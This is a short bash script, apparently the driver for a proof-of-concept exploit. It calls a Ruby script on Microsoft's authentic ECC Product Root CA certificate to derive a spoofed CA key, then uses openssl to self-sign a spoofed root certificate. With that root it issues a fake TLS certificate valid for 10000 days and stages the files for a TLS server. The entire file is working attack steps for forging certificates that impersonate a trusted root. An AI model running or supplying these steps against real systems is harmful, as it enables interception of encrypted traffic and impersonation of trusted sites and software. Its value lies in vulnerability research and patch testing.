#!/usr/bin/env bash

# Create the spoofed Key from the Authentic certificate

ruby PoC.rb OriginalCertificates/MicrosoftECCProductRootCertificateAuthority.cer

#openssl ec -in spoofed_ca.key -text -noout
#
#openssl x509 -in MicrosoftECCProductRootCertificateAuthority.cer -text -noout

openssl req -new -x509 -key FakeCertificates/spoofed_ca.key -out FakeCertificates/spoofed_ca.crt

#echo "======================================================================="
#openssl x509 -in MicrosoftECCProductRootCertificateAuthority.cer -text -noout
#echo "======================================================================="
#openssl x509 -in Fake_cert.crt -text -noout
#echo "======================================================================="

openssl ecparam -name secp384r1 -genkey -noout -out FakeCertificates/my_fake_cert.key

openssl req -new -key FakeCertificates/my_fake_cert.key -out FakeCertificates/my_fake_cert.csr -config openssl_tls.conf -reqexts v3_tls

openssl x509 -req -in FakeCertificates/my_fake_cert.csr -CA FakeCertificates/spoofed_ca.crt -CAkey FakeCertificates/spoofed_ca.key -CAcreateserial -out FakeCertificates/my_fake_cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls

cp FakeCertificates/my_fake_cert.crt TLS/my_fake_cert.crt
cp FakeCertificates/my_fake_cert.key TLS/my_fake_cert.key
cp FakeCertificates/spoofed_ca.crt TLS/spoofed_ca.crt
